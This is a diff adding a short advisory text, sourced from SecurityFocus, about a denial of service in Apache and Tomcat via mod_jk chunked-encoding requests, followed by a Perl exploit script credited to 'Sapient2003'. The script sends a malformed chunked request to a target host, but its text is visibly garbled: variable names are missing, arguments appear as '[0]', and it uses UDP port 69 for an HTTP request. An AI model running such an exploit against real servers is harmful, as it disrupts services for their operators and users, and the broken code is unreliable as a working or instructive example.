@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/6320/info
+
+Apache Webserver and Tomcat are HTTP servers maintained and distributed by the Apache project. Apache Webserver and Tomcat are available for the Unix, Linux, and Microsoft Windows platforms.
+
+It has been reported that a denial of service exists in Apache Webserver and Tomcat when mod_jk is used. Due to design problems in the module, a user submitting malicious requests to the Apache Webserver may cause desynchronization between Apache and Tomcat. This could be done through malicious chunked encoding requests.
+
+#!/usr/bin/perl -w
+
+use IO::Socket;
+
+ = "Apache 1.3.x, Tomcat 4.x Server, mod_jk 1.2 using Apache Jserv
+Protocol 1.3";
+
+unless (@ARGV == 1) {
+  print "\n By Sapient2003\n";
+  die "usage: -bash <host to exploit>\n";
+}
+print "\n By Sapient2003\n";
+
+ = "GET / HTTP/1.0\nHost: [0]\nTransfer-ENcoding:
+Chunked\n53636f7474";
+
+ = IO::Socket::INET->new(
+        PeerAddr => [0],
+        PeerPort => 69,
+        Proto    => "udp",
+) or die "Can't find host [0]\n";
+print  ;
+print "Attempted to exploit [0]\n";
+close();
